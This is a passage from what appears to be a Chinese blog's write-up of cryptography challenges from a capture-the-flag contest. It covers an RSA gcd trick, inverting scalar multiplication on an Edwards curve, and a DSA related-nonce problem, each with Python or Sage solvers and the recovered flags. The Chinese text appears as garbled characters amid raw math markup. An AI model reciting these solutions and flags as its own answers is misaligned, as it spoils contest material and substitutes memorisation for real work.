(p-1)*(q-1)\\N*d=1+k*(p-1)*(q-1)\\ç”±æ¬§æ‹‰å®šç†å¾—ï¼š2^{N*d}\equiv2^{1+k*(p-1)*(q-1)}\equiv=2\mod p*q=2+k*pq\\ä¸Næ±‚gcdå³å¯å¾—åˆ°p*q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord cjk_fallback">ç”±</span><span class="mord cjk_fallback">æ¬§</span><span class="mord cjk_fallback">æ‹‰</span><span class="mord cjk_fallback">å®š</span><span class="mord cjk_fallback">ç†</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">ï¼š</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mbin mtight">âˆ—</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.938em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">âˆ—</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mbin mtight">âˆ—</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">ä¸</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">æ±‚</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">å³</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">åˆ°</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span>*<br>N = <span class="hljs-number">539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span><br>d = <span class="hljs-number">58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span><br>c = <span class="hljs-number">82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175</span><br><br>pq = gcd(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,d*N,N)-<span class="hljs-number">2</span>,N)<br><br>m = <span class="hljs-built_in">pow</span>(c,d,pq)<br><span class="hljs-built_in">print</span>(n2s(m))<br><span class="hljs-comment">#b&#x27;D0g3xGC&#123;W1sh_Y0u_Go0d_L@ucK-111&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="curve"><a class="markdownIt-Anchor" href="#curve"></a> Curve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sagemath</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">P, Q</span>):<br>    (x1, y1) = P<br>    (x2, y2) = Q<br><br>    x3 = (x1*y2 + y1*x2) * inverse(<span class="hljs-number">1</span> + d*x1*x2*y1*y2, p) % p<br>    y3 = (y1*y2 - a*x1*x2) * inverse(<span class="hljs-number">1</span> - d*x1*x2*y1*y2, p) % p<br>    <span class="hljs-keyword">return</span> (x3, y3)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">x, P</span>):<br>    Q = (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> x &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> x % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>            Q = add(Q, P)<br>        P = add(P, P)<br>        x = x &gt;&gt; <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> Q<br><br>p = <span class="hljs-number">64141017538026690847507665744072764126523219720088055136531450296140542176327</span><br>a = <span class="hljs-number">362</span><br>d = <span class="hljs-number">7</span><br>e=<span class="hljs-number">0x10001</span><br><br>gx=bytes_to_long(<span class="hljs-string">b&#x27;D0g3xGC&#123;*****************&#125;&#x27;</span>)<br><br>PR.&lt;y&gt;=PolynomialRing(Zmod(p))<br>f=(d*gx^<span class="hljs-number">2</span>-<span class="hljs-number">1</span>)*y^<span class="hljs-number">2</span>+(<span class="hljs-number">1</span>-a*gx^<span class="hljs-number">2</span>)<br>gy=<span class="hljs-built_in">int</span>(f.roots()[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">assert</span> (a*gx^<span class="hljs-number">2</span>+gy^<span class="hljs-number">2</span>)%p==(<span class="hljs-number">1</span>+d*gx^<span class="hljs-number">2</span>*gy^<span class="hljs-number">2</span>)%p<br><br>G=(gx,gy)<br><br>eG = mul(e, G)<br><span class="hljs-built_in">print</span>(eG)<br><br><span class="hljs-comment">#eG = (34120664973166619886120801966861368419497948422807175421202190709822232354059, 11301243831592615312624457443883283529467532390028216735072818875052648928463)</span><br><br></code></pre></td></tr></table></figure><p>ç›´æ¥å¥—é¸¡å—å¸ˆå‚…çš„è„šæœ¬å°±è¡Œäº†ï¼š<a href="https://tangcuxiaojikuai.xyz/post/187210a7.html">https://tangcuxiaojikuai.xyz/post/187210a7.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p = <span class="hljs-number">64141017538026690847507665744072764126523219720088055136531450296140542176327</span><br>a = <span class="hljs-number">362</span><br>d = <span class="hljs-number">7</span><br>e=<span class="hljs-number">0x10001</span><br>eG = (<span class="hljs-number">34120664973166619886120801966861368419497948422807175421202190709822232354059</span>, <span class="hljs-number">11301243831592615312624457443883283529467532390028216735072818875052648928463</span>)<br>c=<span class="hljs-number">1</span><br><span class="hljs-comment">#part2 map to ECC</span><br>F = GF(p)<br>dd = F(d*c^<span class="hljs-number">4</span>)<br>A = F(<span class="hljs-number">2</span>) * F(a+dd) / F(a-dd)<br>B = F(<span class="hljs-number">4</span>) / F(a-dd)<br>a = F(<span class="hljs-number">3</span>-A^<span class="hljs-number">2</span>) / F(<span class="hljs-number">3</span>*B^<span class="hljs-number">2</span>)<br>b = F(<span class="hljs-number">2</span>*A^<span class="hljs-number">3</span>-<span class="hljs-number">9</span>*A) / F(<span class="hljs-number">27</span>*B^<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edwards_to_ECC</span>(<span class="hljs-params">x,y</span>):<br>    x1 = F(x) / F(c)<br>    y1 = F(y) / F(c)<br>    <span class="hljs-comment">#now curve is a*x^2+y^2 = 1+dd*x^2*y^2</span><br><br>    x2 = F(<span class="hljs-number">1</span>+y1) / F(<span class="hljs-number">1</span>-y1)<br>    y2 = F(x2) / F(x1)<br>    <span class="hljs-comment">#now curve is By^2 = x^3 + Ax^2 + x</span><br><br>    x3 = (F(<span class="hljs-number">3</span>*x2) + F(A)) / F(<span class="hljs-number">3</span>*B)<br>    y3 = F(y2) / F(B)<br>    <span class="hljs-comment">#now curve is y^2 = x^3 + ax + b</span><br><br>    <span class="hljs-keyword">return</span> (x3,y3)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ECC_to_edwards</span>(<span class="hljs-params">x,y</span>):<br>    x2 = (F(x) * F(<span class="hljs-number">3</span>*B) - F(A)) / F(<span class="hljs-number">3</span>)<br>    y2 = F(y) * F(B)<br>    <span class="hljs-comment">#now curve is By^2 = x^3 + Ax^2 + x</span><br><br>    x1 = F(x2) / F(y2)<br>    y1 = F(<span class="hljs-number">1</span>) - (F(<span class="hljs-number">2</span>) / F(x2+<span class="hljs-number">1</span>))<br>    <span class="hljs-comment">#now curve is a*x^2+y^2 = 1+dd*x^2*y^2</span><br><br>    x_ = F(x1) * F(c)<br>    y_ = F(y1) * F(c)<br>    <span class="hljs-comment">#now curve is a*x^2+y^2 = c^2(1+d*x^2*y^2)</span><br>    <br>    <span class="hljs-keyword">return</span> (x_,y_)<br> <br>E = EllipticCurve(GF(p), [a, b])<br>order = E.order()<br>eG = E(edwards_to_ECC(eG[<span class="hljs-number">0</span>],eG[<span class="hljs-number">1</span>]))<br>t = inverse(e,order)<br>G = t*eG<br>G = ECC_to_edwards(G[<span class="hljs-number">0</span>],G[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(G[<span class="hljs-number">0</span>])))<br><span class="hljs-comment">#b&#x27;D0g3xGC&#123;SOlvE_The_Edcurv3&#125;&#x27;</span><br><br></code></pre></td></tr></table></figure><h2 id="ez_sign"><a class="markdownIt-Anchor" href="#ez_sign"></a> EZ_sign</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> random,os<br><br>flag = <span class="hljs-string">b&#x27;D0g3xGA&#123;***************&#125;&#x27;</span><br>msg = <span class="hljs-string">b&#x27;e = ?&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sign</span>(<span class="hljs-params">pub, pri, k</span>):<br>    (p,q,g,y) = pub<br>    x = pri<br>    r = <span class="hljs-built_in">int</span>(powmod(g, k, p) % q)<br>    H = bytes_to_long(sha1(os.urandom(<span class="hljs-number">20</span>)).digest())<br>    s = <span class="hljs-built_in">int</span>((H + r * x) * invert(k, q) % q)<br>    <span class="hljs-keyword">return</span> (H,r,s)<br><br>k1 = getPrime(<span class="hljs-number">64</span>)<br>k2 = k1 ** <span class="hljs-number">2</span><br>pri = bytes_to_long(msg)<br>a = <span class="hljs-number">149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203</span><br>b = <span class="hljs-number">829396411171540475587755762866203184101195238207</span><br>g = <span class="hljs-number">87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397</span><br>y = <span class="hljs-number">97644672217092534422903769459190836176879315123054001151977789291649564201120414036287557280431608390741595834467632108397663276781265601024889217654490419259208919898180195586714790127650244788782155032615116944102113736041131315531765220891253274685646444667344472175149252120261958868249193192444916098238</span><br><br>pub = (a, b, g, y)<br><br>H1, r1, s1 = sign(pub, pri, k1)<br><br>H2, r2, s2 = sign(pub, pri, k2)<br><br>p = getPrime(<span class="hljs-number">128</span>)<br>q = getPrime(<span class="hljs-number">128</span>)<br>n = p * q<br>c = powmod(bytes_to_long(flag), e, n)<br><br>C = p**<span class="hljs-number">2</span> + q**<span class="hljs-number">2</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;(H1, r1, s1) = <span class="hljs-subst">&#123;H1&#125;</span>, <span class="hljs-subst">&#123;r1&#125;</span>, <span class="hljs-subst">&#123;s1&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;(H2, r2, s2) = <span class="hljs-subst">&#123;H2&#125;</span>, <span class="hljs-subst">&#123;r2&#125;</span>, <span class="hljs-subst">&#123;s2&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(C)<br></code></pre></td></tr></table></figure><p>å‰é¢æŒ‰ç…§çº¿æ€§kçš„dsaæ­£å¸¸åˆ†æ</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>k</mi><mn>2</mn></msub><mo>=</mo><mi>a</mi><mo>âˆ—</mo><msub><mi>k</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mspace linebreak="newline"></mspace><msub><mi>r</mi><mn>1</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msup><mi>g</mi><msub><mi>k</mi><mn>1</mn></msub></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mspace width="1em"/><mspace width="1em"/><msub><mi>s</mi><mn>1</mn></msub><mo>=</mo><msubsup><mi>k</mi><mn>1</mn><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msubsup><mo>âˆ—</mo><mo stretchy="false">(</mo><msub><mi>H</mi><mn>1</mn></msub><mo>+</mo><mi>x</mi><mo>âˆ—</mo><msub><mi>r</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mspace linebreak="newline"></mspace><msub><mi>r</mi><mn>2</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msup><mi>g</mi><msub><mi>k</mi><mn>2</mn></msub></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mspace width="1em"/><mspace width="1em"/><msub><mi>s</mi><mn>2</mn></msub><mo>=</mo><msubsup><mi>k</mi><mn>2</mn><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msubsup><mo>âˆ—</mo><mo stretchy="false">(</mo><msub><mi>H</mi><mn>2</mn></msub><mo>+</mo><mi>x</mi><mo>âˆ—</mo><msub><mi>r</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mspace linebreak="newline"></mspace><mtext>ç­¾åå¯¹</mtext><mo stretchy="false">(</mo><mi>r</mi><mo separator="true">,</mo><msub><mi>s</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>r</mi><mo separator="true">,</mo><msub><mi>s</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k_2=a*k_1+b\\r_1=(g^{k_1}\mod p) \mod q\quad\quad s_1=k_1^{-1}*(H_1+x*r_1)\mod q\\r_2=(g^{k_2}\mod p) \mod q\quad\quad s_2=k_2^{-1}*(H_2+x*r_2)\mod q\\ç­¾åå¯¹(r,s_1),(r,s_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.899108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03148em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span 